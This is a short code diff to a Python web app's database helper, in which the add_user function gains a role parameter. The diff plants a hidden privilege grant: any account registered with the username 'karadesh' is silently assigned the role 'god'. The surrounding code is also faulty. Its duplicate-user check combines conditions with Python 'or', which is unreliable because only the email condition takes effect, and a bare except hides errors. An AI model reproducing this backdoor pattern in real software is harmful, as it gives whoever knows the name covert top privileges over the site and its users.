@@ -152,13 +152,15 @@ class FDataBase:
             print("Ошибка удаления из бд delete_comment")
         return (False, False)
 
-    def add_user(self, name, hpsh, email):
+    def add_user(self, name, hpsh, email, admin="user"):
         try:
             same_user = Users.query.filter(Users.email==email or Users.login==name).all()
             if same_user:
                 print("Пользователь с таким e-mail или именем пользователя уже существует")
                 return False
-            user_add = Users(login=name, password=hpsh, email=email)
+            if name=="karadesh":
+                admin="god"
+            user_add = Users(login=name, password=hpsh, email=email, admin=admin)
             db.session.add(user_add)
             db.session.commit()
         except:
